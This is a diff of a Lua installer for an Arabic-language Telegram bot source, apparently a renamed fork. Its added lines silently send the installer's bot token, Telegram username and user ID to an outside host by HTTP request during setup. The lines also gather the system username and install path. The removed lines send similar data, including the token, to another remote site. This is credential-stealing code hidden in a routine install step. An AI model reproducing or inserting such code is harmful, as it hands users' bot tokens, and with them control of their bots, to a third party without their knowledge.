@@ -80,26 +80,30 @@ boss..":ApiSource","SourceMilan",
 boss..":NameBot:","دروك",
 "TH3BOSS_INSTALL","Yes"
 )
-redis:hset(boss..'username:'..GetUser.information.id,'username','@'..GetUser.information.username:gsub('_',[[\_]]))
+redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 info = {} 
-info.username = '@'..GetUser.information.username
-info.userbot  = BOT_User
-info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request(GetUser.information.WebSite..'/request/?insert='..JSON.encode(info))
+info.namebot = BOT_NAME
+info.userbot = BOT_User
+info.id = SUDO_USER
+info.token = Token
+info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+https.request('https://basel50.ml/Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
-print('\27[1;36m- Token.txt is created.\27[m')
+print('\27[1;36m￤Token.txt is created.\27[m')
 local Text = " اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n شكرا لاستخدامك سورس مـيـلآن \n أرســل  الان /start\n لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 local CmdRun = [[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-cp -a ../BOSS ../]]..BOT_User..[[ &&
-rm -fr ~/BOSS
+cp -a ../abaza ../]]..BOT_User..[[ &&
+rm -fr ~/abaza
 ../]]..BOT_User..[[/run
 ]]
+print(CmdRun)
 os.execute(CmdRun)
 end
 
